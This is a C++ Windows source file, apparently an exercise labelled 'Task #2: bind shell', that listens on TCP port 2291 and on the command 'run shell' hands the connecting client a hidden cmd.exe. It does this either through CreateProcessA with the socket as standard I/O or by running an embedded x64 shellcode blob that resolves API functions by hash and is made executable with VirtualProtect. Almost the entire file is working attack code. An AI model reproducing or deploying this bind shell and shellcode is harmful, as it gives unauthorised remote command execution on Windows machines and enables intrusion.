// Task #2: bind shell
// Client (local):  $ socat TCP4:localhost:2291 STDIO
// Client (remote):  $ socat TCP4:192.168.1.64:2291 STDIO
#include <winsock2.h>
#include <ws2tcpip.h>

#include <windows.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

using namespace std;


int RunDemo()
{
	// Initialize local vars
	SOCKADDR_IN stAddrClient = { 0 };
	STARTUPINFOA stStartupInfo = { 0 };
	PROCESS_INFORMATION stProcessInfo = { 0 };

	string szShell = "cmd.exe";
	string szTestMsg = "[+] Socket works\n";

	int iPort = 2291;
	SOCKET iSockClient = 0;
	int cbAddrClient = sizeof(SOCKADDR_IN);
	int iCurrentIp = 0;
	int iCurrentPort = 0;

	// Find client socket
	// Iterate through sockets and find one with ip != INADDR_ANY and port == 2291
	while (true)
	{
		// Get SOCKADDR_IN structure
		getsockname(iSockClient, (SOCKADDR*)&stAddrClient, &cbAddrClient);
		iCurrentIp = stAddrClient.sin_addr.s_addr;
		iCurrentPort = ntohs(stAddrClient.sin_port);
		if (iCurrentIp != INADDR_ANY and iCurrentPort == 2291)
		{
			break;
		}
		++iSockClient;
	}
	send(iSockClient, szTestMsg.c_str(), szTestMsg.length(), 0);

	// Initialize STARTUPINFOA structure
	stStartupInfo.cb = sizeof(STARTUPINFOA);
	stStartupInfo.wShowWindow = SW_HIDE;
	stStartupInfo.dwFlags = STARTF_USESTDHANDLES;
	stStartupInfo.hStdInput = (HANDLE)iSockClient;
	stStartupInfo.hStdOutput = (HANDLE)iSockClient;
	stStartupInfo.hStdError = (HANDLE)iSockClient;

	// Set UTF-8 encoding
	SetConsoleCP(CP_UTF8);
	SetConsoleOutputCP(CP_UTF8);

	// Spawn shell
	CreateProcessA(NULL, (LPSTR)szShell.c_str(), NULL, NULL, TRUE,
		0, NULL, NULL, (STARTUPINFOA*)&stStartupInfo, &stProcessInfo);

	// Sleep
	Sleep(2000);
	return 0;
}


int RunShellcode()
{
	char shellcode[] = "\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\xc8\x88\x01\x00\x48\x8d\x0d\xcb\x03\x00\x00\xe8\x13\x02\x00\x00\x48\x89\x45\xf0\x48\x8d\x0d\xc8\x03\x00\x00\xe8\x03\x02\x00\x00\x48\x89\x45\xe8\x48\x8d\x0d\x9e\x03\x00\x00\xff\x55\xf0\x48\x89\x45\xf8\x48\x8b\x4d\xf8\x48\x8d\x15\xb5\x03\x00\x00\xff\x55\xe8\x48\x89\x45\xe0\x48\x8b\x4d\xf8\x48\x8d\x15\xb0\x03\x00\x00\xff\x55\xe8\x48\x89\x45\xd8\x48\x8b\x4d\xf8\x48\x8d\x15\xb1\x03\x00\x00\xff\x55\xe8\x48\x89\x45\xd0\x48\x8b\x4d\xf8\x48\x8d\x15\xae\x03\x00\x00\xff\x55\xe8\x48\x89\x45\xc8\x48\x8d\x0d\xa6\x03\x00\x00\xff\x55\xf0\x48\x89\x45\xc0\x48\x8b\x4d\xc0\x48\x8d\x15\x9f\x03\x00\x00\xff\x55\xe8\x48\x89\x45\xb8\x48\x8b\x4d\xc0\x48\x8d\x15\x99\x03\x00\x00\xff\x55\xe8\x48\x89\x45\xb0\x48\x8b\x4d\xc0\x48\x8d\x15\x8d\x03\x00\x00\xff\x55\xe8\x48\x89\x45\xa8\x48\x8d\x4d\x98\xba\x10\x00\x00\x00\x41\xb8\x00\x00\x00\x00\xe8\x50\x02\x00\x00\x48\x8d\x8d\x30\xff\xff\xff\xba\x68\x00\x00\x00\x41\xb8\x00\x00\x00\x00\xe8\x39\x02\x00\x00\x48\x8d\x8d\x18\xff\xff\xff\xba\x18\x00\x00\x00\x41\xb8\x00\x00\x00\x00\xe8\x22\x02\x00\x00\x48\xc7\x85\x10\xff\xff\xff\xf3\x08\x00\x00\x48\xc7\x85\x08\xff\xff\xff\x10\x00\x00\x00\x48\xc7\x85\x00\xff\xff\xff\x00\x00\x00\x00\x41\xbf\x00\x00\x00\x00\x4c\x89\xf9\x48\x8d\x55\x98\x4c\x8d\x85\x08\xff\xff\xff\xff\x55\xb8\x4c\x89\xbd\x00\xff\xff\xff\x49\xff\xc7\x4c\x8d\x65\x98\x41\xbd\x00\x00\x00\x00\x45\x8b\x6c\x24\x04\xb9\x00\x00\x00\x00\x66\x41\x8b\x4c\x24\x02\xff\x55\xb0\x49\x89\xc6\x49\x83\xfd\x00\x74\xbf\x49\x81\xfe\xf3\x08\x00\x00\x75\xb6\x4c\x8b\xb5\x00\xff\xff\xff\x4c\x8d\xa5\x30\xff\xff\xff\x41\xc7\x04\x24\x68\x00\x00\x00\x66\x41\xc7\x44\x24\x40\x00\x00\x41\xc7\x44\x24\x3c\x00\x01\x00\x00\x4d\x89\x74\x24\x50\x4d\x89\x74\x24\x58\x4d\x89\x74\x24\x60\xb9\xe9\xfd\x00\x00\xff\x55\xe0\xb9\xe9\xfd\x00\x00\xff\x55\xd8\x4c\x8d\xa5\x30\xff\xff\xff\x4c\x8d\xad\x18\xff\xff\xff\xb9\x00\x00\x00\x00\x48\x8d\x15\x86\x02\x00\x00\x41\xb8\x00\x00\x00\x00\x41\xb9\x00\x00\x00\x00\x48\xc7\x44\x24\x20\x01\x00\x00\x00\x48\xc7\x44\x24\x28\x00\x00\x00\x00\x48\xc7\x44\x24\x30\x00\x00\x00\x00\x48\xc7\x44\x24\x38\x00\x00\x00\x00\x4c\x89\x64\x24\x40\x4c\x89\x6c\x24\x48\xff\x55\xd0\xb9\xd0\x07\x00\x00\xff\x55\xc8\xc9\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\xc3\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\xc8\xa8\x00\x00\x48\x89\x4d\xf8\x48\x8b\x4d\xf8\xe8\x2a\x01\x00\x00\x48\x89\x45\xf0\x65\x48\x8b\x1c\x25\x60\x00\x00\x00\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x48\x89\x5d\xe8\x4c\x8b\x65\xe8\x41\x8b\x5c\x24\x3c\x4c\x01\xe3\x8b\x9b\x88\x00\x00\x00\x4c\x01\xe3\xb9\x00\x00\x00\x00\x8b\x4b\x10\x48\x89\x4d\xe0\x8b\x4b\x18\x48\x89\x4d\xd8\x8b\x4b\x1c\x4c\x01\xe1\x48\x89\x4d\xd0\x8b\x4b\x20\x4c\x01\xe1\x48\x89\x4d\xc8\x8b\x4b\x24\x4c\x01\xe1\x48\x89\x4d\xc0\x41\xbf\x00\x00\x00\x00\x4c\x8b\x65\xc8\x43\x8b\x1c\xbc\x48\x03\x5d\xe8\x48\x89\x5d\xb8\x4c\x89\x7d\xb0\x48\x8b\x4d\xb8\xe8\x9e\x00\x00\x00\x48\x3b\x45\xf0\x74\x09\x49\xff\xc7\x4c\x3b\x7d\xd8\x75\xd4\xb8\x00\x00\x00\x00\x4c\x8b\x65\xc0\x4c\x8b\x7d\xb0\x66\x43\x8b\x04\x7c\x48\x03\x45\xe0\x48\x89\x45\xa8\xb8\x00\x00\x00\x00\x4c\x8b\x65\xd0\x4c\x8b\x7d\xa8\x4c\x2b\x7d\xe0\x43\x8b\x04\xbc\x48\x03\x45\xe8\x48\x89\x45\xa0\x48\x8b\x45\xa0\xc9\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\xc3\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\xc8\x68\x00\x00\x48\x89\x4d\xf8\x48\x89\x55\xf0\x4c\x89\x45\xe8\x4c\x8b\x65\xf8\x4c\x8b\x6d\xf0\x4c\x8b\x75\xe8\x41\xbf\x00\x00\x00\x00\x4f\x89\x34\x3c\x49\x83\xc7\x08\x4d\x39\xef\x75\xf3\xc9\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\xc3\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\xc8\x58\x00\x00\x48\x89\x4d\xf8\x4c\x8b\x5d\xf8\x41\xbc\x00\x00\x00\x00\x41\xbf\x00\x00\x00\x00\xbb\x00\x00\x00\x00\x43\x8a\x1c\x3b\x48\x83\xfb\x00\x74\x0c\x41\xc1\xcc\x0d\x49\x01\xdc\x49\xff\xc7\xeb\xe5\x4c\x89\xe0\xc9\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\xc3\x00\x00\xf5\xff\xff\xff\xff\xff\xff\xff\x0a\x00\x70\x61\x75\x73\x65\x00\x6b\x65\x72\x6e\x65\x6c\x33\x32\x2e\x64\x6c\x6c\x00\x4c\x6f\x61\x64\x4c\x69\x62\x72\x61\x72\x79\x41\x00\x47\x65\x74\x50\x72\x6f\x63\x41\x64\x64\x72\x65\x73\x73\x00\x53\x65\x74\x43\x6f\x6e\x73\x6f\x6c\x65\x43\x50\x00\x53\x65\x74\x43\x6f\x6e\x73\x6f\x6c\x65\x4f\x75\x74\x70\x75\x74\x43\x50\x00\x43\x72\x65\x61\x74\x65\x50\x72\x6f\x63\x65\x73\x73\x41\x00\x53\x6c\x65\x65\x70\x00\x77\x73\x32\x5f\x33\x32\x2e\x64\x6c\x6c\x00\x67\x65\x74\x73\x6f\x63\x6b\x6e\x61\x6d\x65\x00\x6e\x74\x6f\x68\x73\x00\x73\x65\x6e\x64\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x30\x00\x00\x63\x6d\x64\x2e\x65\x78\x65\x00\x5b\x2b\x5d\x20\x53\x6f\x63\x6b\x65\x74\x20\x77\x6f\x72\x6b\x73\x0a\x0a\x00";

	cout << "Shellcode size: " << sizeof(shellcode) << endl;
	DWORD flOldProtect;
	BOOL ret = VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &flOldProtect);
	if (!ret)
	{
		cout << "[-] VirtualProtect is enabled" << endl;
		return 1;
	}
	(*(void (*)()) & shellcode)();
	return 0;
}


int main(int argc, char* argv[])
{
	//#include <cstddef>
	//SOCKADDR_IN stAddrClient = {0};
	//cout << sizeof(stAddrClient.sin_addr.s_addr) << endl;
	//cout << offsetof(SOCKADDR_IN, sin_addr.s_addr) << endl;
	//cout << offsetof(in_addr, s_net) << endl;
	//exit(55);

	// Initialize local vars
	WSADATA stWsaData = { 0 };
	SOCKADDR_IN stAddrServer = { 0 };

	int iPort = 2291;
	SOCKET iSockServer = 0;
	SOCKET iSockClient = 0;


	// Create server socket
	WSAStartup(MAKEWORD(2, 2), &stWsaData);
	iSockServer = WSASocketW(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
	cout << "Server socket: " << iSockServer << endl;

	// Initialize SOCKADDR_IN structure
	stAddrServer.sin_family = AF_INET;
	stAddrServer.sin_addr.s_addr = INADDR_ANY;
	stAddrServer.sin_port = htons(iPort);

	// Bind & listen
	bind(iSockServer, (struct sockaddr*)&stAddrServer, sizeof(stAddrServer));
	listen(iSockServer, SOMAXCONN);
	cout << "[*] Listening on port " << iPort << endl;

	// Accept incoming connection
	iSockClient = WSAAccept(iSockServer, NULL, NULL, NULL, 0);
	cout << "Client socket: " << iSockClient << endl;

	// Interract with client & wait for "run shell" request
	while (true)
	{
		string msg = "Open shell with 'run shell'\n";
		send(iSockClient, msg.c_str(), msg.length(), 0);
		char request[1024] = { 0 };
		recv(iSockClient, request, 1024, 0);
		cout << "Received data: " << request << endl;
		if ((string)request == "run shell\n")
		{
			string msg = "cmd.exe will be spawned...\n";
			send(iSockClient, msg.c_str(), msg.length(), 0);
			break;
		}
	}

	// RunDemo();
	RunShellcode();

	// Close sockets
	closesocket(iSockClient);
	closesocket(iSockServer);
	system("pause");
	return 0;
}